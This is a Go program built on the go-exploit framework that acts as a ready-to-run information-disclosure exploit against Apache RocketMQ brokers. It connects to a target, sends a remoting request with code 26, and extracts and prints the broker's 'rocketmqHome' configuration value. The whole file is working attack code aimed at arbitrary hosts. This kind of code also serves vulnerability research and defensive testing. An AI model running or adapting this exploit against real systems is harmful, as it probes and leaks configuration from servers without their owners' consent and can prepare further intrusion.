package main

import (
	"regexp"

	"github.com/vulncheck-oss/go-exploit"
	"github.com/vulncheck-oss/go-exploit/c2"
	"github.com/vulncheck-oss/go-exploit/config"
	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/protocol"
	"github.com/vulncheck-oss/go-exploit/protocol/rocketmq"
)

type RocketMQConfFetch struct{}

func (sploit RocketMQConfFetch) ValidateTarget(_ *config.Config) bool {
	output.PrintStatus("Not implemented")

	return true
}

func (sploit RocketMQConfFetch) CheckVersion(_ *config.Config) exploit.VersionCheckType {
	return exploit.NotImplemented
}

func (sploit RocketMQConfFetch) RunExploit(conf *config.Config) bool {
	conn, ok := protocol.MixedConnect(conf.Rhost, conf.Rport, conf.SSL)
	if !ok {
		return false
	}

	mqMessage := rocketmq.CreateMqRemotingMessage("", 26, 437)
	if !protocol.TCPWrite(conn, mqMessage) {
		return false
	}

	_, body, ok := rocketmq.ReadMqRemotingResponse(conn)
	if !ok {
		return false
	}

	re := regexp.MustCompile(`rocketmqHome=(.*)`)
	res := re.FindAllStringSubmatch(string(body), -1)
	if len(res) == 0 {
		output.PrintError("Failed to extract the variable")

		return false
	}

	output.PrintSuccess("Extracted the variable", "rocketmqHome", res[0][1], "host", conf.Rhost, "port", conf.Rport)

	return true
}

func main() {
	conf := config.New(config.InformationDisclosure, []c2.Impl{}, "RocketMQ Broker", "", 10909)

	sploit := RocketMQConfFetch{}
	exploit.RunProgram(sploit, conf)
}
